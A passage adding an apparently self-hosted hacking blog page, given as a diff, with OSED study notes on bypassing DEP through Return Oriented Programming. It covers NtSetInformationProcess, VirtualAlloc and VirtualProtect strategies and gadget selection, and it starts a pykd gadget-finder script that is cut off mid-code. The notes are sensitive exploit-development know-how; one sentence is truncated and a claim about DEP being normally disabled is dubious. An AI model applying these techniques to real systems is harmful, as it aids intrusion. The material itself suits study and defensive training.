@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+        <script>
+            if (location.host != new URL("http:\/\/localhost:1313\/").host) location.href = "http:\/\/localhost:1313\/"
+        </script>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='http://localhost:1313/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='http://localhost:1313/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='http://localhost:1313/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='http://localhost:1313/favicon.png'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+        purpurina - a place for hacking
+    </title>
+
+    
+    <link href="http://localhost:1313/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
+    <link href="http://localhost:1313/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.b88203936c598b692d9cbebd7da89eb34e544b8522ae4c14ca657761be96b80c2acee8e6631de04d99ee1bdbc1bcad4a3add6f47a2366f4a29e2c531782be1a8.css integrity="sha512-uIIDk2xZi2ktnL69faies05US4UirkwUymV3Yb6WuAwqzujmYx3gTZnuG9vBvK1KOt1vR6I2b0op4sUxeCvhqA==" />
+<meta name="author" content="jaco" />
+
+    
+    
+        <meta name="description" content="P Lore&lt;/h1&gt;
+&lt;h2 id=&#34;why-is-rop-needed&#34;&gt;Why is ROP needed&lt;/h2&gt;
+&lt;p&gt;The classic buffer overflows manage to execute arbitrary code by redirecting the execution flow to &lt;strong&gt;something in the stack (that is normally also user-controlled)&lt;/strong&gt;.
+However, the normal program flow does &lt;strong&gt;not need to redirect the execution flow of the stack as the code that is being executed is normally&lt;/strong&gt; in the .text section of the binary. The stack is used to store and manage local variables and parameters to functions.&lt;/p&gt;" />
+    
+
+<meta property="og:site_name"
+    content='purpurina - a place for hacking' />
+
+    <meta property="og:title" content="" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="jaco" />
+    <meta
+        property="article:published_time"
+        content='0001-01-01T00:00:00Z&#43;0000' />
+    
+    <meta property="og:url" content="http://localhost:1313/posts/osed_rop_1/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta property="og:description" content="&lt;h1 id=&#34;rop-lore&#34;&gt;ROP Lore&lt;/h1&gt;
+&lt;h2 id=&#34;why-is-rop-needed&#34;&gt;Why is ROP needed&lt;/h2&gt;
+&lt;p&gt;The classic buffer overflows manage to execute arbitrary code by redirectin" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/osed_rop_1/" />
+
+
+    <meta name="twitter:title" content="" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/icon512.png" />
+    
+        <meta name="twitter:description" content="&lt;h1 id=&#34;rop-lore&#34;&gt;ROP Lore&lt;/h1&gt;
+&lt;h2 id=&#34;why-is-rop-needed&#34;&gt;Why is ROP needed&lt;/h2&gt;
+&lt;p&gt;The classic buffer overflows manage to execute arbitrary code by redirectin" />
+    
+
+<link rel="manifest" href="http://localhost:1313/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="http://localhost:1313/">
+                    <img src='http://localhost:1313/logo.jpg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="http://localhost:1313/">purpurina - a place for hacking</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="http://localhost:1313/">Home</a></li>
+        
+            <li><a href="http://localhost:1313/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="http://localhost:1313/about/">About</a></li>
+        
+        
+            <li><a href="http://localhost:1313/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/jacobocasado/?originalSubdomain=es">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1></h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    0001-01-01
+
+</p>
+    
+    
+    
+    
+    <div><h1 id="rop-lore">ROP Lore</h1>
+<h2 id="why-is-rop-needed">Why is ROP needed</h2>
+<p>The classic buffer overflows manage to execute arbitrary code by redirecting the execution flow to <strong>something in the stack (that is normally also user-controlled)</strong>.
+However, the normal program flow does <strong>not need to redirect the execution flow of the stack as the code that is being executed is normally</strong> in the .text section of the binary. The stack is used to store and manage local variables and parameters to functions.</p>
+<h2 id="distinction-between-codedata-regions">Distinction between code/data regions</h2>
+<p>So in order to avoid the classic buffer overflow, the operating system marks the pages of memory of the stack as non-executable, modifying the NX bit of the CPU. The kernel sets the NX bit when the OS maps a memory page.
+If an application attempts to execute code from a data page that is protected (NX bit), a memory access violation exception occurs, and if the exception is not handled, the calling process is terminated.
+<strong>Note: normally, DEP and NX is disabled at OS level but some BIOS allows disabling the bit directly in the BIOS config</strong>. This is so that the CPU does not enforce this security mechanism.</p>
+<h2 id="ret2libc-in-linux">Ret2libc in Linux</h2>
+<p>Originally, to bypass DEP a jump to the libc function was performed, passing the arguments. You set the arguments in the stack, and call the function you want to execute of the libc, which is executable code.</p>
+<p>Over the years, the technique was expanded, and the commonly-used Return Oriented Programming (ROP) method was developed, allowing the user to execute any code routine and not only specific library functions.</p>
+<h2 id="old-dep-bypass-by-using-rop-windows">Old DEP bypass by using ROP (Windows)</h2>
+<p>Exploit developers first abused the fact that DEP <strong>could</strong> be disabled on a per-process basis in Windows.
+Even if DEP was enabled as a &ldquo;AlwaysOn&rdquo; system policy, it could be disabled per process once the process is running.
+The idea was to invoke the <code>NtSetInformationProcess</code> API, which resides in a memory region that is already executable. With this, an attacker could disable DEP before executing their shellcode. Therefore, mark the stack as executable again and execute our shellcode in the stack. This works by replacing the commonly-used &ldquo;jump to shellcode&rdquo; for the memory address of NtSetInformationProcess. Additionally, we also have to place the required arguments on the stack as part of the overwrite.
+Once the NtSetInformationProcess API finishes, DEP is disabled, and we can jump to our shellcode again. Other attack variations have been widely used in public exploits. One such attack uses the WinExec function to execute commands on the vulnerable system. While this is useful, it is not as effective as having arbitrary shellcode execution.</p>
+<p>Now, Windows implements the <strong>Permanent DEP:</strong> any executable linked with the <code>/NXCOMPAT</code> flag is automatically set as <code>OptIn</code>, meaning that it DEP cannot be disabled.
+The only option then is to <strong>circumvent the operating system NX checks.</strong></p>
+<h1 id="rop-technical-considerations">ROP technical considerations</h1>
+<p>Instead of setting in our stacks the &ldquo;libc&rdquo; or whatever function we want to execute in a memory page with execution, a more general approach was designed.
+We can design a technique to call <strong>any instruction sequence we want, if these conditions are met:</strong></p>
+<ul>
+<li>The instruction(s) we want to execute are followed by a ret at the end</li>
+<li>The instruction we want is in a memory page with execution rights.
+If that condition happens, the instruction is a ROP gadget.</li>
+</ul>
+<p>We will replace RIP <strong>with the memory address of any &ldquo;gadget&rdquo;</strong>, so we jump to that instruction, execute it, and then return to the next instruction to execute (which will be the next element in the stack).
+For that, we need to have the necessary gadgets in the application to perform our task.
+The number of obtainable gadgets depends on the OS version and the vulnerable application.</p>
+<h2 id="different-rop-approaches">Different ROP approaches</h2>
+<p>At this point, depending on our goals and on the number of gadgets we can obtain, there are two different approaches we could take:</p>
+<ol>
+<li>Build a 100% ROP shellcode.</li>
+<li>Build a ROP stage that can lead to subsequent execution of traditional shellcode.</li>
+</ol>
+<p>The first approach is rather complicated to implement, so we’ll pursue the second instead. A goal of the ROP stage could be to allocate a chunk of memory with write and execute permissions and then copy shellcode to it.</p>
+<p>One way to implement this ROP attack is to allocate memory using the Win32 VirtualAlloc API. A different approach to bypass DEP could be to change the permissions of the memory page where the shellcode already resides by calling the Win32 VirtualProtect API. The address of both functions is usually retrieved from the Import Address Table (IAT) of the target DLL that contains them. Then the required parameters need to be pushed in the stack, which can also be done using ROP gadgets and are usually done dinamically using ROP gadgets as you can&rsquo;t hardcode the parameters (e.g., you might n)</p>
+<p>Another alternative is to use the WriteProcessMemory to hot-patch any code section (normally the .text section) with shellcode and jump into it. Sometimes a call to NtProtectVirtualMemory or similar might be done in order to turn the memory page to writable (as code sections are normally RX but not WRX or WX).</p>
+<p>However, in both approaches, we are jumping to a executable sections instead of modifying the &ldquo;NX&rdquo; flag of the memory pages of the stack.</p>
+<h2 id="gadget-selection">Gadget selection</h2>
+<p>So far, we have a good understanding of the theory behind DEP and how to overcome it with ROP. A key missing element is how to locate the gadgets that are needed to invoke the APIs.</p>
+<p>In the classic buffer overflow, we use the WinDbg search command to obtain the address of an instruction like JMP ESP. For ROP though, we need to locate the addresses of all the possible gadgets we can obtain. This first step will allow us to choose the gadgets we need and combine them to bypass DEP.</p>
+<p>However, it’s difficult to search for gadgets manually because of the large number of possible candidates. Instead, we’ll need to automate the process. We will discuss two different methods.</p>
+<p><strong>Note: Typically, it is not beneficial to search for very long ROP gadgets because they will eventually contain instructions that are not useful, such as calls and jumps.</strong> The OSED course shows that more than 5 instructions could start to be a serious problem. We filter by 5 and then filter the resulting gadgets.</p>
+<p>Note that:</p>
+<ul>
+<li>jmp and call gadgets alter the execution flow, which might break our chain.</li>
+<li>push, pop gadgets change the stack, we have to be careful with that.</li>
+<li>mov esp, or any esp operation, alter the stack pointer, we have to be careful with that.</li>
+<li>Assembly language contains several privileged instructions, which a regular application cannot execute. We must design our algorithm to remove these also.</li>
+</ul>
+<pre tabindex="0"><code>Bad instructions for gadgets: Privileged + unknown opcode &#34;???&#34; + jumps/calls
+BAD = [&#34;clts&#34;, &#34;hlt&#34;, &#34;lmsw&#34;, &#34;ltr&#34;, &#34;lgdt&#34;, &#34;lidt&#34; ,&#34;lldt&#34;, &#34;mov cr&#34;, &#34;mov dr&#34;, &#34;mov tr&#34;, &#34;in &#34;, &#34;ins&#34;, &#34;invlpg&#34;, &#34;invd&#34;, &#34;out&#34;, &#34;outs&#34;, &#34;cli&#34;, &#34;sti&#34; &#34;popf&#34;, &#34;pushf&#34;, &#34;int&#34;, &#34;iret&#34;, &#34;iretd&#34;, &#34;swapgs&#34;, &#34;wbinvd&#34;, &#34;call&#34;, &#34;jmp&#34;, &#34;leave&#34;, &#34;ja&#34;, &#34;jb&#34;, &#34;jc&#34;, &#34;je&#34;, &#34;jr&#34;, &#34;jg&#34;, &#34;jl&#34;, &#34;jn&#34;, &#34;jo&#34;, &#34;jp&#34;, &#34;js&#34;, &#34;jz&#34;, &#34;lock&#34;, &#34;enter&#34;, &#34;wait&#34;, &#34;???&#34;]
+</code></pre><p><strong>Note</strong>: In some advanced cases, we might want to make use of a gadget containing a conditional jump instruction or a call. If we craft the stack layout appropriately, we can make use of these gadgets without disrupting the execution flow, but typically, it is best to avoid them altogether unless strictly required by specific conditions.</p>
+<p><strong>Note</strong>: In x64, each memory page is 0x1000 (4kb). Each module will have several memory pages, so we want to analyze all of them in search of our gadgets. Some of them will be executable, some of them will not be.</p>
+<h3 id="pykd-for-gadget-selection">Pykd for gadget selection</h3>
+<p>Python-based WinDbg extension, that can be used also as individual scripts.</p>
+<p>The pykd script must locate gadgets inside code pages of an EXE or DLL with the execute permission set.</p>
+<p>The first step is to accept the name of the module as a parameter and locate it in memory. Then, for the selected module, we locate all memory pages that are executable.
+Code that is executed on these pages will not result in DEP throwing an access violation.
+For each of these memory pages, we are going to locate the memory address of all the RET assembly instructions and store them in a list.
+Once we have this list of memory addresses, we pick the first one, subtract one byte from it, and disassemble the opcodes to check if they are valid assembly instructions. If they are, we have found a possible ROP gadget. This process will continue, by subtracting another byte and rechecking.</p>
+<p>This is the pykd that will perform our gadget search functionality:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pykd <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HEADER <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>HEADER <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;# findrop.py - pykd module for Gadget Discovery</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>HEADER <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##MEM_ACCESS = {</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x1   : &#34;PAGE_NOACCESS&#34;                                                    ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x2   : &#34;PAGE_READONLY&#34;                                                    ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x4   : &#34;PAGE_READWRITE&#34;                                                   ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x8   : &#34;PAGE_WRITECOPY&#34;                                                   ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x10  : &#34;PAGE_EXECUTE&#34;                                                     ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x20  : &#34;PAGE_EXECUTE_READ&#34;                                                ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x40  : &#34;PAGE_EXECUTE_READWRITE&#34;                                           ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x80  : &#34;PAGE_EXECUTE_WRITECOPY&#34;                                           ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x101 : &#34;PAGE_NOACCESS PAGE_GUARD&#34;                                         ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x102 : &#34;PAGE_READONLY PAGE_GUARD &#34;                                        ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x104 : &#34;PAGE_READWRITE PAGE_GUARD&#34;                                        ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x108 : &#34;PAGE_WRITECOPY PAGE_GUARD&#34;                                        ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x110 : &#34;PAGE_EXECUTE PAGE_GUARD&#34;                                          ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x120 : &#34;PAGE_EXECUTE_READ PAGE_GUARD&#34;                                     ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x140 : &#34;PAGE_EXECUTE_READWRITE PAGE_GUARD&#34;                                ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x180 : &#34;PAGE_EXECUTE_WRITECOPY PAGE_GUARD&#34;                                ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x301 : &#34;PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE&#34;                            ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x302 : &#34;PAGE_READONLY PAGE_GUARD PAGE_NOCACHE&#34;                            ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x304 : &#34;PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE&#34;                           ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x308 : &#34;PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE&#34;                           ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x310 : &#34;PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE&#34;                             ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x320 : &#34;PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE&#34;                        ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x340 : &#34;PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE&#34;                   ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x380 : &#34;PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE&#34;                   ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x701 : &#34;PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;          ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x702 : &#34;PAGE_READONLY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;          ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x704 : &#34;PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;         ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x708 : &#34;PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;         ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x710 : &#34;PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;           ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x720 : &#34;PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;      ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x740 : &#34;PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34; ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x780 : &#34;PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34; ,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MEM_ACCESS_EXE <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE&#34;</span>                                                     ,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x20</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE_READ&#34;</span>                                                ,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x40</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE_READWRITE&#34;</span>                                           ,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x80</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE_WRITECOPY&#34;</span>                                           ,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PAGE_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span>MAX_GADGET_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BAD <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;clts&#34;</span>, <span style="color:#e6db74">&#34;hlt&#34;</span>, <span style="color:#e6db74">&#34;lmsw&#34;</span>, <span style="color:#e6db74">&#34;ltr&#34;</span>, <span style="color:#e6db74">&#34;lgdt&#34;</span>, <span style="color:#e6db74">&#34;lidt&#34;</span> ,<span style="color:#e6db74">&#34;lldt&#34;</span>, <span style="color:#e6db74">&#34;mov cr&#34;</span>, <span style="color:#e6db74">&#34;mov dr&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;mov tr&#34;</span>, <span style="color:#e6db74">&#34;in &#34;</span>, <span style="color:#e6db74">&#34;ins&#34;</span>, <span style="color:#e6db74">&#34;invlpg&#34;</span>, <span style="color:#e6db74">&#34;invd&#34;</span>, <span style="color:#e6db74">&#34;out&#34;</span>, <span style="color:#e6db74">&#34;outs&#34;</span>, <span style="color:#e6db74">&#34;cli&#34;</span>, <span style="color:#e6db74">&#34;sti&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;popf&#34;</span>, <span style="color:#e6db74">&#34;pushf&#34;</span>, <span style="color:#e6db74">&#34;int&#34;</span>, <span style="color:#e6db74">&#34;iret&#34;</span>, <span style="color:#e6db74">&#34;iretd&#34;</span>, <span style="color:#e6db74">&#34;swapgs&#34;</span>, <span style="color:#e6db74">&#34;wbinvd&#34;</span>, <span style="color:#e6db74">&#34;call&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;jmp&#34;</span>, <span style="color:#e6db74">&#34;leave&#34;</span>, <span style="color:#e6db74">&#34;ja&#34;</span>, <span style="color:#e6db74">&#34;jb&#34;</span>, <span style="color:#e6db74">&#34;jc&#34;</span>, <span style="color:#e6db74">&#34;je&#34;</span>, <span style="color:#e6db74">&#34;jr&#34;</span>, <span style="color:#e6db74">&#34;jg&#34;</span>, <span style="color:#e6db74">&#34;jl&#34;</span>, <span style="color:#e6db74">&#34;jn&#34;</span>, <span style="color:#e6db74">&#34;jo&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;jp&#34;</span>, <span style="color:#e6db74">&#34;js&#34;</span>, <span style="color:#e6db74">&#34;jz&#34;</span>, <span style="color:#e6db74">&#34;lock&#34;</span>, <span style="color:#e6db74">&#34;enter&#34;</span>, <span style="color:#e6db74">&#34;wait&#34;</span>, <span style="color:#e6db74">&#34;???&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">log</span>(msg):
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Log a message to console.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param msg: Message string
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: None
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;[+] &#34;</span> <span style="color:#f92672">+</span> msg)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getModule</span>(modname):
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Return a module object.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param modname: string module name
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: pykd module object
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> module(modname)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">isPageExec</span>(address):
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Return True if a mem page is marked as executable
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param address: address in hex format 0x41414141.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: Bool
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>     protect <span style="color:#f92672">=</span> getVaProtect(address)
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>     protect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> protect <span style="color:#f92672">in</span> MEM_ACCESS_EXE<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findExecPages</span>(mod):
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Find Executable Memory Pages for a module.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param mod: module object returned by getModule
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: a python list of executable memory pages
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> pages <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span> pn <span style="color:#f92672">=</span> int((mod<span style="color:#f92672">.</span>end() <span style="color:#f92672">-</span> mod<span style="color:#f92672">.</span>begin()) <span style="color:#f92672">/</span> PAGE_SIZE)
+</span></span><span style="display:flex;"><span> log(<span style="color:#e6db74">&#34;Total Memory Pages: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> pn)
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, pn):
+</span></span><span style="display:flex;"><span>     page <span style="color:#f92672">=</span> mod<span style="color:#f92672">.</span>begin() <span style="color:#f92672">+</span> i<span style="color:#f92672">*</span>PAGE_SIZE
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> isPageExec(page):
+</span></span><span style="display:flex;"><span>         pages<span style="color:#f92672">.</span>append(page)
+</span></span><span style="display:flex;"><span> log(<span style="color:#e6db74">&#34;Executable Memory Pages: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> len(pages))
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> pages
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findRetn</span>(pages):
+</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Find all return instructions for the given memory pages.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param pages: list of memory pages
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: list of memory addresses
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span> retn <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> page <span style="color:#f92672">in</span> pages:
+</span></span><span style="display:flex;"><span>     ptr <span style="color:#f92672">=</span> page
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">while</span> ptr <span style="color:#f92672">&lt;</span> (page <span style="color:#f92672">+</span> PAGE_SIZE):
+</span></span><span style="display:flex;"><span>         b <span style="color:#f92672">=</span> loadSignBytes(ptr, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
